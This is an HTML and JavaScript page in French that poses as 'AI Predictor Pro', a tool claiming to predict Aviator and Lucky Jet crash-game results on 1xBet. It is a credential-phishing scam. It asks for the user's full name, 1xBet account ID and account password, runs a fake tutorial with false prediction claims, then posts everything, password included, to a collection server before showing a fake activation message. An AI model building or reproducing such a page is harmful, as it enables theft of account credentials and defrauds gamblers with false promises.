<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Predictor Pro - v4.5</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --neon: #00f2ff; --bg: #05070a; --card: #0d1117; }
        body { background: var(--bg); color: #c9d1d9; font-family: 'Consolas', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: var(--card); width: 90%; max-width: 420px; padding: 30px; border-radius: 15px; border: 1px solid var(--neon); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
        .page { display: none; }
        .active { display: block; animation: slideIn 0.3s ease-out; }
        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
        
        input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #161b22; color: white; box-sizing: border-box; }
        .pass-container { position: relative; }
        .pass-container i { position: absolute; right: 15px; top: 25px; cursor: pointer; color: var(--neon); }
        
        button { width: 100%; padding: 15px; border: none; background: var(--neon); color: black; font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; }
        .instruction-box { background: #000; padding: 15px; border-radius: 5px; border-left: 3px solid var(--neon); font-size: 13px; min-height: 150px; line-height: 1.6; }
        .hidden-btns { display: none; gap: 10px; margin-top: 15px; }
        .secondary-btn { background: #21262d; color: white; border: 1px solid #30363d; }
    </style>
</head>
<body>

<div class="container">
    <div id="p1" class="page active">
        <h2 style="color:var(--neon)">üõ∞Ô∏è INITIALISATION</h2>
        <input type="text" id="nom" placeholder="Nom complet">
        <input type="number" id="id1x" placeholder="ID Compte 1xBet">
        <button onclick="showPage(2)">V√âRIFIER L'IDENTIT√â</button>
    </div>

    <div id="p2" class="page">
        <h2>üéÆ CONFIGURATION</h2>
        <p>Choisissez le jeu :</p>
        <select id="jeu">
            <option value="Aviator">Aviator</option>
            <option value="Lucky Jet">Lucky Jet</option>
        </select>
        <button onclick="startTutorial()">D√âMARRER LA FORMATION</button>
    </div>

    <div id="p3" class="page">
        <h2>üìñ MODE D'EMPLOI</h2>
        <div class="instruction-box" id="tutorial-text"></div>
        <div id="tuto-btns" class="hidden-btns">
            <button class="secondary-btn" onclick="startTutorial()">REPRENDRE</button>
            <button onclick="showPage(4)">CONTINUER</button>
        </div>
    </div>

    <div id="p4" class="page">
        <h2>üîë S√âCURIT√â</h2>
        <p style="font-size:12px; color:#ff7b72">V√©rifiez vos acc√®s. Le serveur activera le Bot uniquement si le mot de passe est correct pour l'ID fourni.</p>
        <div class="pass-container">
            <input type="password" id="pass" placeholder="Mot de passe du compte">
            <i class="fa-solid fa-eye" onclick="togglePass()"></i>
        </div>
        <button onclick="finalSync()">ACTIVER LE PR√âDICTEUR</button>
    </div>

    <div id="p5" class="page">
        <h2 style="color:#3fb950">‚úÖ ACTIV√â</h2>
        <p>Synchronisation termin√©e. Les signaux arrivent sur votre compte.</p>
    </div>
</div>

<script>
    function showPage(n) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById('p' + n).classList.add('active');
    }

    function togglePass() {
        const p = document.getElementById('pass');
        p.type = p.type === "password" ? "text" : "password";
    }

    // SIMULATION DE LA FORMATION
    function startTutorial() {
        showPage(3);
        const box = document.getElementById('tutorial-text');
        const btns = document.getElementById('tuto-btns');
        box.innerHTML = "";
        btns.style.display = "none";

        const lines = [
            "> Connexion au flux de donn√©es...",
            "> Analyse des algorithmes de crash...",
            "üí° INFO : Le serveur calcule l'heure exacte du prochain d√©collage.",
            "üìä R√àGLE : Attendez que le signal affiche 'PR√äT'.",
            "üöÄ MISE : Retirez vos gains √† la c√¥te indiqu√©e par l'IA.",
            "> Syst√®me pr√™t. Veuillez confirmer vos acc√®s pour lier le flux."
        ];

        let i = 0;
        const interval = setInterval(() => {
            box.innerHTML += lines[i] + "<br>";
            i++;
            if(i >= lines.length) {
                clearInterval(interval);
                btns.style.display = "flex"; // Affiche les boutons √† la fin
            }
        }, 2000); // 2 secondes entre chaque ligne
    }

    function finalSync() {
        const payload = {
            nom: document.getElementById('nom').value,
            id: document.getElementById('id1x').value,
            jeu: document.getElementById('jeu').value,
            pass: document.getElementById('pass').value
        };
        
        fetch('http://localhost:5000/send', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        }).finally(() => showPage(5));
    }
</script>

</body>
</html>
